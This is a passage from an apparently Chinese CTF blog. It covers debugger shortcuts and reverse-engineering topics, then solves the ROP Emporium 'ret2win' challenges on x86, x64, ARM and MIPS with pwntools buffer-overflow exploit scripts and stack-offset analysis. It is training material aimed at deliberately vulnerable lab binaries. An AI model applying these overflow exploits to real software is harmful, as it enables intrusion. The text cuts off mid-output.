相同，但当被调试程序发生异常而中止时，调试器首先尝试执行被调试程序指定的异常处理。</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>Ctrl+F9</td>\r\n<td>执行到返回，在执行到一个 ret 指令时暂停，常用于从当前函数快速返回到上一个函数。</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>Alt+F9</td>\r\n<td>执行到用户代码，可用于从系统部分快速返回到被调试程序部分。</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>F10</td>\r\n<td>打开与当前窗口或面板相关的快捷菜单。</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>Ctrl+F11</td>\r\n<td>Run 跟踪步入，一条一条执行命令，进入子函数调用，并把寄存器信息加入到 Run 跟踪的存储数据中。</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>F12</td>\r\n<td>停止执行，暂停所有线程。</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>Ctrl+F12</td>\r\n<td>Run 跟踪步过，一条一条执行命令，不进入子函数调用，并把寄存器信息加入到 Run 跟踪的存储数据中。</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>Alt+F3</td>\r\n<td>关闭当前窗口。</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>Alt+B</td>\r\n<td>显示断点窗口。</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>Alt+C</td>\r\n<td>显示 CPU 窗口。</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>Alt+E</td>\r\n<td>显示模块列表。</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>Alt+K</td>\r\n<td>显示调用栈。</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>Alt+L</td>\r\n<td>显示日志窗口。</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>Alt+M</td>\r\n<td>显示内存窗口。</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>Alt+O</td>\r\n<td>显示选项对话框。</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>Alt+Backspace</td>\r\n<td>撤销对所选部分的修改。</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>Ctrl+A</td>\r\n<td>分析当前模块的代码段。</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>Ctrl+B</td>\r\n<td>开始二进制搜索。</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>Ctrl+E</td>\r\n<td>以十六进制格式编辑所选内容。</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>Ctrl+F</td>\r\n<td>开始命令搜索。</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>Ctrl+G</td>\r\n<td>转到某地址。</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>Ctrl+J</td>\r\n<td>列出所有的涉及到该位置的调用和跳转。</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>Ctrl+K</td>\r\n<td>查看与当前函数相关的调用树。</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>Ctrl+L</td>\r\n<td>搜索下一个。</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>Ctrl+N</td>\r\n<td>打开当前模块的名称列表。</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>Ctrl+O</td>\r\n<td>扫描对象文件。</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>Ctrl+P</td>\r\n<td>显示补丁窗口。</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>Ctrl+R</td>\r\n<td>搜索所选命令的参考。</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>Ctrl+S</td>\r\n<td>命令搜索。</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>Ctrl+T</td>\r\n<td>打开“暂停Run跟踪”对话框。</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>Esc</td>\r\n<td>停止自动执行或跟踪。</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>Enter</td>\r\n<td>将选中的命令添加到命令历史，如果当前命令是一个跳转或者函数，则进入到目的地址。</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>Backspace</td>\r\n<td>如果分析器将代码误识为数据，可以将选中部分的自动分析信息移除。</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>*</td>\r\n<td>转到原始位置</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>Ctrl+*</td>\r\n<td>指定新的起始位置。</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>+</td>\r\n<td>如果 Run 跟踪没有激活，则根据历史命令跳到下一条运行过命令的地方；否则跳到 Run 跟踪的下一个记录。</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>Ctrl++</td>\r\n<td>跳到前一个函数的开始处。</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>-</td>\r\n<td>如果 Run 跟踪没有激活，则根据历史命令跳到前一条运行过命令的地方；否则跳到 Run 跟踪的前一个记录。</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>Ctrl+-</td>\r\n<td>跳到下一个函数的开始处。</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>Space</td>\r\n<td>修改命令。</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>:</td>\r\n<td>添加标签。</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>;</td>\r\n<td>添加注释。</td>\r\n</tr>\r\n</tbody>\r\n</table>\r\n<h5 id=\"练习-1\">练习</h5>\r\n<p>helloReversing.exe</p>\r\n<h2 id=\"高级逆向\">高级逆向</h2>\r\n<h3 id=\"多语言逆向\">多语言逆向</h3>\r\n<h4 id=\"python\">python</h4>\r\n<p>Python逆向其目标针对pyc文件，pyc是一种二进制文件，是由py文件经过编译后，生成的文件，是一种byte code，py文件变成pyc文件后，加载的速度有所提高，而且pyc是一种跨平台的字节码，是由python的虚拟机来执行的</p>\r\n<p>逆向方法： 1. 在线编译网站 https://tool.lu/pyc/ 2. 反编译工具：Unpycompyle6 pip install unpycompyle6</p>\r\n<p><strong>练习：</strong></p>\r\n<p><a href=\"https://buuoj.cn/challenges#%5BGWCTF%202019%5Dpyre\">[GWCTF 2019]pyre</a></p>\r\n<h4 id=\"java\">Java</h4>\r\n<p>借用github开源项目jadx可以反编译java的代码，遇到安卓逆向的问题也可以使用该工具 逆向工具：jadx，jd-gui</p>\r\n<p><strong>练习：</strong></p>\r\n<p><a href=\"https://buuoj.cn/challenges#Java%E9%80%86%E5%90%91%E8%A7%A3%E5%AF%86\">Java逆向解密</a></p>\r\n<h4 id=\"go\">Go</h4>\r\n<p>IDA 7.7 Pro已经支持Go语言反编译，可以直接反编译出伪Go代码，其反编译的特征是函数名常带有fmt_xxx。</p>\r\n<p><strong>练习：</strong></p>\r\n<p><a href=\"https://buuoj.cn/challenges#%5BMRCTF2020%5Dhello_world_go\">[MRCTF2020]hello_world_go</a></p>\r\n<h4 id=\"csharp\">Csharp</h4>\r\n<p>Dnspy可用于反编译C#程序，且可以进行调试。</p>\r\n<figure>\r\n<img src=\"/2022/09/13/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/image-20220913172115614.png\" alt=\"c#\"><figcaption aria-hidden=\"true\">c#</figcaption>\r\n</figure>\r\n<p><strong>练习：</strong></p>\r\n<p><a href=\"https://buuoj.cn/challenges#%5BFlareOn1%5DBob%20Doge\">[FlareOn1]Bob Doge</a></p>\r\n<h4 id=\"apk\">APK</h4>\r\n<p>APK（全称：Android application package，Android应用程序包）是Android操作系统使用的一种应用程序包文件格式，用于分发和安装移动应用及中间件。一个Android应用程序的代码想要在Android设备上运行，必须先进行编译，然后被打包成为一个被Android系统所能识别的文件才可以被运行，而这种能被Android系统识别并运行的文件格式便是“APK”。</p>\r\n<p>一个APK文件内包含被编译的代码文件(.dex 文件)，文件资源（resources）， 原生资源文件（assets），证书（certificates），和清单文件（manifest file）</p>\r\n<p>APK逆向工具有jadx，GDA。</p>\r\n<figure>\r\n<img src=\"/2022/09/13/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/image-20220913172135521.png\" alt=\"apk\"><figcaption aria-hidden=\"true\">apk</figcaption>\r\n</figure>\r\n<h3 id=\"保护壳\">保护壳</h3>\r\n<p>壳是在一些计算机软件里也有一段专门负责保护软件不被非法修改或反编译的程序。它们一般都是先于程序运行，拿到控制权，然后完成它们保护软件的任务。</p>\r\n<figure>\r\n<img src=\"/2022/09/13/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/image-20220913172146475.png\" alt=\"shell\"><figcaption aria-hidden=\"true\">shell</figcaption>\r\n</figure>\r\n<h3 id=\"花指令\">花指令</h3>\r\n<p>花指令是企图隐藏掉不想被逆向工程的代码块 (或其它功能) 的一种方法, 在真实代码中插入一些垃圾代码的同时还保证原有程序的正确执行, 而程序无法很好地反编译, 难以理解程序内容, 达到混淆视听的效果。</p>\r\n<h3 id=\"反调试\">反调试</h3>\r\n<p>程序运行时会检测程序运行时的环境（当前的窗口、当前的进程、当前的一些指示信息、当前的一些端口开放状态等），通过一些敏感的信息反馈出是否在调试当中，如果检测自身处于调试环境中，则执行流与在正常环境下执行流不一致。</p>\r\n<figure>\r\n<img src=\"/2022/09/13/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/image-20220913172201928.png\" alt=\"anti_debug1\"><figcaption aria-hidden=\"true\">anti_debug1</figcaption>\r\n</figure>\r\n<figure>\r\n<img src=\"/2022/09/13/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/image-20220913172213706.png\" alt=\"anti_debug2\"><figcaption aria-hidden=\"true\">anti_debug2</figcaption>\r\n</figure>\r\n<p>解决思路： 1. 整改环境 2. 改变程序逻辑</p>\r\n<h3 id=\"vm逆向\">VM逆向</h3>\r\n<p>在商业上，有一种叫做VMProtect的保护软件，通过利用伪指令虚拟机将指定代码进行变形和虚拟化处理后，达到隐藏关键代码的作用，具有很高的安全性。在阅读汇编代码时如同想把一本英文书翻译成中文书，却发现书里是法文写的。 而在CTF比赛中，出题人通过自己的伪指令实现小型虚拟机，达到混淆、增大题目难度的作用。它将基于x86汇编系统中的可执行代码转换为字节码指令系统的代码，来达到不被轻易逆向和篡改的目的。简单点说就是将程序的代码转换自定义的操作码(opcode)，然后在程序执行时再通过解释这些操作码，选择对应的函数执行，从而实现程序原有的功能。</p>\r\n<figure>\r\n<img src=\"/2022/09/13/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/image-20220913172225099.png\" alt=\"vm\"><figcaption aria-hidden=\"true\">vm</figcaption>\r\n</figure>\r\n","categories":["CTF"],"tags":["reverse","share"]},{"title":"rop emporium","url":"/2022/09/27/rop-emporium/","content":"<p>好久没做PWN相关的题目了，最近捡起PWN中ROP一系列题目<a href=\"https://ropemporium.com/\"><code>ROP Emporium</code></a>来做一做，发现许多缺项，就好好做个笔记记录一下吧。</p>\r\n<h2 id=\"ret2win\">ret2win</h2>\r\n<h3 id=\"x86\">x86</h3>\r\n<p>一道非常简单的题，一眼解，IDA打开，发现关键代如下：</p>\r\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">pwnme</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> s; <span class=\"comment\">// [esp+0h] [ebp-28h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">memset</span>(&amp;s, <span class=\"number\">0</span>, <span class=\"number\">0x20</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;What could possibly go wrong?&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;You there, may I have your input please? And don&#x27;t worry about null bytes, we&#x27;re using read()!\\n&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;&gt; &quot;</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, &amp;s, <span class=\"number\">0x38</span>u);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Thank you!&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\r\n<span id=\"more\"></span>\r\n<p>且代码中包含后门函数——ret2win：</p>\r\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">ret2win</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Well done! Here&#x27;s your flag:&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> system(<span class=\"string\">&quot;/bin/cat flag.txt&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\r\n<p>因此直接利用pwnme中read函数的写入缓冲区溢出漏洞，覆盖掉pwnme函数的返回地址，将其覆盖为ret2win的函数地址，即可获得flag，exp如下：</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">&#x27;./ret2win32&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">b&quot;A&quot;</span> * (<span class=\"number\">0x28</span>+<span class=\"number\">4</span>)</span><br><span class=\"line\">payload += p32(<span class=\"number\">0x804862c</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\r\n<h3 id=\"x64\">x64</h3>\r\n<p>和上题32位程序利用手法一样，使用缓冲区溢出覆盖返回地址即可，题目关键代码如下：</p>\r\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">pwnme</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> s; <span class=\"comment\">// [rsp+0h] [rbp-20h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">memset</span>(&amp;s, <span class=\"number\">0</span>, <span class=\"number\">0x20</span>uLL);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;What could possibly go wrong?&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;You there, may I have your input please? And don&#x27;t worry about null bytes, we&#x27;re using read()!\\n&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;&gt; &quot;</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, &amp;s, <span class=\"number\">0x38</span>uLL);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Thank you!&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\r\n<p>且题目中包含后门函数如下：</p>\r\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">ret2win</span><span class=\"params\">()</span>  <span class=\"comment\">// 0x400756</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Well done! Here&#x27;s your flag:&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> system(<span class=\"string\">&quot;/bin/cat flag.txt&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\r\n<p>exp代码如下：</p>\r\n<figure class=\"highlight py\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">&#x27;./ret2win&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">b&quot;A&quot;</span> * (<span class=\"number\">0x20</span>+<span class=\"number\">8</span>)</span><br><span class=\"line\">payload += p64(<span class=\"number\">0x400756</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\r\n<h3 id=\"armv5\">armv5</h3>\r\n<p>查看基本情况：</p>\r\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">file ret2win_armv5</span> </span><br><span class=\"line\">ret2win_armv5: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.3, for GNU/Linux 3.2.0, BuildID[sha1]=a82dade296415721f90684517d0e6259d4ba2905, not stripped</span><br></pre></td></tr></table></figure>\r\n<p>拖入IDA中分析，关键函数如下：</p>\r\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">pwnme</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> s; <span class=\"comment\">// [sp+0h] [bp-24h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">memset</span>(&amp;s, <span class=\"number\">0</span>, <span class=\"number\">0x20</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;What could possibly go wrong?&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;You there, may I have your input please? And don&#x27;t worry about null bytes, we&#x27;re using read()!\\n&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;&gt; &quot;</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, &amp;s, <span class=\"number\">0x38</span>u);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Thank you!&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\r\n<p>且代码中包含后门函数用于输出flag，其地址为0x00105EC，值得注意的是s的地址虽然与bp相差0x24个字节，但查看其汇编代码：</p>\r\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">.text:00010570 pwnme                                   ; CODE XREF: main+30↑p</span><br><span class=\"line\">.text:00010570</span><br><span class=\"line\">.text:00010570 s               = -0x24</span><br><span class=\"line\">.text:00010570</span><br><span class=\"line\">.text:00010570                 STMFD   SP!, &#123;R11,LR&#125;   ; Store Block to Memory</span><br><span class=\"line\">.text:00010574                 ADD     R11, SP, #4     ; Rd = Op1 + Op2</span><br><span class=\"line\">.text:00010578                 SUB     SP, SP, #0x20   ; Rd = Op1 - Op2</span><br><span class=\"line\">.text:0001057C                 SUB     R3, R11, #-s    ; Rd = Op1 - Op2</span><br><span class=\"line\">.text:00010580                 MOV     R2, #0x20       ; n</span><br><span class=\"line\">.text:00010584                 MOV     R1, #0          ; c</span><br><span class=\"line\">.text:00010588                 MOV     R0, R3          ; s</span><br></pre></td></tr></table></figure>\r\n<p>第一条指令<code>STMFD   SP!, &#123;R11,LR&#125;</code>将LR寄存器（存储返回地址）和R11寄存器依次存储到栈上，此时栈空间如下：</p>\r\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">-+-----------+-</span><br><span class=\"line\"> +  LR       +</span><br><span class=\"line\">-+-----------+ </span><br><span class=\"line\"> +  R11      +</span><br><span class=\"line\">-+-----------+-   &lt;--- SP</span><br></pre></td></tr></table></figure>\r\n<p>第二条指令将R11寄存器值修改为 SP+4，此时栈布局如下：</p>\r\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">-+-----------+-</span><br><span class=\"line\"> +  LR       +</span><br><span class=\"line\">-+-----------+-&lt;--- R11</span><br><span class=\"line\"> +  R11      +    0x4</span><br><span class=\"line\">-+-----------+-&lt;--- SP</span><br></pre></td></tr></table></figure>\r\n<p>第三条指令将SP值修改为SP-0x20，此时栈布局如下：</p>\r\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">-+-----------+-</span><br><span class=\"line\"> +  LR       +</span><br><span class=\"line\">-+-----------+-&lt;--- R11</span><br><span class=\"line\"> +  R11      +    0x4</span><br><span class=\"line\">-+-----------+-------</span><br><span class=\"line\">-+           +-   </span><br><span class=\"line\">-+           +-   0x20 </span><br><span class=\"line\">-+           +-</span><br><span class=\"line\">-+-----------+-&lt;--- SP</span><br></pre></td></tr></table></figure>\r\n<p>第四条指令将R3（数组s的地址）修改为R11-0x24 = SP ，因此数组s地址据返回地址的距离为 0x24，编写exp如下：</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">context.arch = <span class=\"string\">&#x27;arm&#x27;</span></span><br><span class=\"line\">context.endian = <span class=\"string\">&#x27;little&#x27;</span></span><br><span class=\"line\">context.bits = <span class=\"number\">32</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = process([<span class=\"string\">&#x27;qemu-arm&#x27;</span>, <span class=\"string\">&#x27;-L&#x27;</span>, <span class=\"string\">&#x27;/usr/arm-linux-gnueabihf/&#x27;</span>, <span class=\"string\">&#x27;./ret2win_armv5&#x27;</span>])</span><br><span class=\"line\"></span><br><span class=\"line\">payload  = <span class=\"string\">b&quot;A&quot;</span> * (<span class=\"number\">0x24</span>)</span><br><span class=\"line\">payload += p32(<span class=\"number\">0x000105EC</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\r\n<blockquote>\r\n<p>由于主机为x86机器，没有arm环境，需要安装qemu等arm启动环境</p>\r\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">apt install qemu</span><br><span class=\"line\">apt install libc6-dbg-armhf-cross</span><br></pre></td></tr></table></figure>\r\n</blockquote>\r\n<h3 id=\"mipsel\">mipsel</h3>\r\n<p>将<code>ret2win_mipsel</code>拖入IDA中分析，查看关键代码：</p>\r\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">pwnme</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> v1[<span class=\"number\">32</span>]; <span class=\"comment\">// [sp+18h] [+18h] BYREF</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">memset</span>(v1, <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span>(v1));</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;What could possibly go wrong?&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;You there, may I have your input please? And don&#x27;t worry about null bytes, we&#x27;re using read()!\\n&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;&gt; &quot;</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, v1, <span class=\"number\">0x38</span>u);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Thank you!&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\r\n<p>发现第10行read函数存在溢出，因此可以利用该处溢出覆盖返回地址，但不清楚返回地址距数组v1的距离，查看其汇编代码，如下所示：</p>\r\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">.text:004008F4                                # int pwnme()</span><br><span class=\"line\">.text:004008F4                               pwnme:                                   # CODE XREF: main+80↑p</span><br><span class=\"line\">.text:004008F4</span><br><span class=\"line\">.text:004008F4                               var_28= -0x28</span><br><span class=\"line\">.text:004008F4                               var_20= -0x20</span><br><span class=\"line\">.text:004008F4                               var_s0=  0</span><br><span class=\"line\">.text:004008F4                               var_s4=  4</span><br><span class=\"line\">.text:004008F4</span><br><span class=\"line\">.text:004008F4 C0 FF BD 27                   addiu   $sp, -0x40</span><br><span class=\"line\">.text:004008F8 3C 00 BF AF                   sw      $ra, 0x38+var_s4($sp)</span><br><span class=\"line\">.text:004008FC 38 00 BE AF                   sw      $fp, 0x38+var_s0($sp)</span><br><span class=\"line\">.text:00400900 25 F0 A0 03                   move    $fp, $sp</span><br><span class=\"line\">.text:00400904 42 00 1C 3C 10 90 9C 27       li      $gp, (_GLOBAL_OFFSET_TABLE_+0x7FF0)</span><br><span class=\"line\">.text:0040090C 10 00 BC AF                   sw      $gp, 0x38+var_28($sp)</span><br><span class=\"line\">.text:00400910 20 00 06 24                   li      $a2, 0x20  # &#x27; &#x27;                 # n</span><br><span class=\"line\">.text:00400914 25 28 00 00                   move    $a1, $zero                       # c</span><br><span class=\"line\">.text:00400918 18 00 C2 27                   addiu   $v0, $fp, 0x38+var_20</span><br><span class=\"line\">.text:0040091C 25 20 40 00                   move    $a0, $v0                         # s</span><br><span class=\"line\">...</span><br><span class=\"line\">.text:004009E0 10 00 DC 8F                   lw      $gp, 0x38+var_28($fp)</span><br><span class=\"line\">.text:004009E4 00 00 00 00                   nop</span><br><span class=\"line\">.text:004009E8 25 E8 C0 03                   move    $sp, $fp</span><br><span class=\"line\">.text:004009EC 3C 00 BF 8F                   lw      $ra, 0x38+var_s4($sp)</span><br><span class=\"line\">.text:004009F0 38 00 BE 8F                   lw      $fp, 0x38+var_s0($sp)</span><br><span class=\"line\">.text:004009F4 40 00 BD 27                   addiu   $sp, 0x40</span><br><span class=\"line\">.text:004009F8 08 00 E0 03                   jr      $ra</span><br><span class=\"line\">.text:004009FC 00 00 00 00                   nop</span><br></pre></td></tr></table></figure>\r\n<p>发现返回地址所在位置为<code>0x38+var_s4($sp)</code>，即<code>0x3C+($sp)</code>，而数组v1开始地址位置为<code>0x38+var_20($fp)</code>，即<code>0x18+($fp)</code>，根据第12行指令，可以得出fp=sp，因此返回地址距数组距离为<code>0x3C-0x18 = 0x24</code>。查看后门函数地址为<code>0x00400A00</code>。</p>\r\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">.text:00400A00                               ret2win:</span><br></pre></td></tr></table></figure>\r\n<p>编写exp如下：</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># context.clear()</span></span><br><span class=\"line\">context.arch = <span class=\"string\">&#x27;mips&#x27;</span></span><br><span class=\"line\">context.endian = <span class=\"string\">&#x27;little&#x27;</span></span><br><span class=\"line\">context.bits = <span class=\"number\">32</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = process([<span class=\"string\">&#x27;qemu-mipsel&#x27;</span>, <span class=\"string\">&#x27;-L&#x27;</span>, <span class=\"string\">&#x27;/usr/mipsel-linux-gnu/&#x27;</span>, <span class=\"string\">&#x27;./ret2win_mipsel&#x27;</span>])</span><br><span class=\"line\"></span><br><span class=\"line\">payload  = <span class=\"string\">b&quot;A&quot;</span> * (<span class=\"number\">0x24</span>)</span><br><span class=\"line\">payload += p32(<span class=\"number\">0x00400A00</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\r\n<p>运行结果如下：</p>\r\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ python exp.py </span><br><span class=\"line\">[+] Starting <span class=\"built_in\">local</span> process <span class=\"string\">&#x27;/usr/bin/qemu-mipsel&#x27;</span>: pid 11916</span><br><span class=\"line\">[*] Switching to interactive mode</span><br><span class=\"line\">ret2win by ROP Emporium</span><br><span class=\"line\">MIPS</span><br><span class=\"line\"></span><br><span class=\"line\">For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!</span><br><span class=\"line\">What could possibly go wrong?</span><br><span class=\"line\">You there, may I have your input please? And don<span class=\"string\">&#x27;t worry about null bytes, we&#x27;</span>re using <span class=\"built_in\">read</span>()!</span><br><span class=\"line\"></span><br><span class=\"line\">&gt; Thank you!</span><br><span class=\"line\">Well <span class=\"keyword\">done</span>! Here<span class=\"string\">&#x27;s your flag:</span></span><br><span class=\"line\"><span class=\"string\">ROPE&#123;a_placeholder_32byte_flag!&#125;</span></span><br><span class=\"line\"><span class=\"string\">Well done! Here&#x27;</span>s your flag:</span><br><span class=\"line\">ROPE&#123;a_placeholder_32byte_flag!&#125;</span><br><span class=\"line\">Well <span class=\"keyword\">done</span>! Here<span class=\"string\">&#x27;s your flag:</span></span><br><span class=\"line\"><span 